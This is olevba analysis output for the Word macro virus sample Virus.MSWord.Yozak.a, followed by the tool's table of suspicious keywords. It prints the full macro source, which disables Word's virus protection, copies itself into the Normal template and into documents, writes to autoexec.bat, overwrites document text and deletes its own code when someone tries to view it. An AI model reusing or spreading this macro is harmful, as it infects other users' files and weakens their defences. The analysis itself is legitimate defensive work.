olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yozak.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yozak.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Sub Alpha()
Sub autoopen()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Application.DisplayRecentFiles = False
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("Tools").Visible = False
If NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 1) = "'Sub Alpha()" Then
nti = 101
Else
nti = 100
End If
If ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 1) = "'Sub Alpha()" Then
adi = 101
Else
adi = 100
End If
If adi = 100 And nti = 101 Then
a = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 50)
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 1000
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromstring a
ElseIf adi = 101 And nti = 100 Then
a = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 50)
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 1000
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromstring a
End If
If Day(Now) = (12 * Rnd + 3 + 6) Then
MsgBox "[qwertyuiopasdfghjklzxcvbnm]" & vbCr & "New Order of coderz and cyber criminals", vbApplicationModal, "Alphabet"
Beep
MsgBox "[mnbvcxzlkjhgfdsapoiuytrewq]" & vbCr & "I don't need this fucking world", vbCritical, "Alpha Project From [dr]yozak"
Beep
Open "c:\autoexec.bat" For Random As hhlpfile
Print hhlpfile; "echo Clan Of Cyber Criminals waz here"
Print hhlpfile; "echo visit our web site members.xoom.com/CCCriminals"
Print hhlpfile; "echo [mnbvcxzpoiuytrewqalskdjfhg]"
Close hhlpfile
Selection.SetRange 1, 1000
Selection.Text = "qwertyuiopmnbvcxzasdflkjhg1234567890-=\][;/.,`~!@#$%^&*()_+|}{:'<>?"
End If
End Sub
Sub viewvbcode()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 50
NormalTemplate.Saved = False
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 50
Application.ShowVisualBasicEditor = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

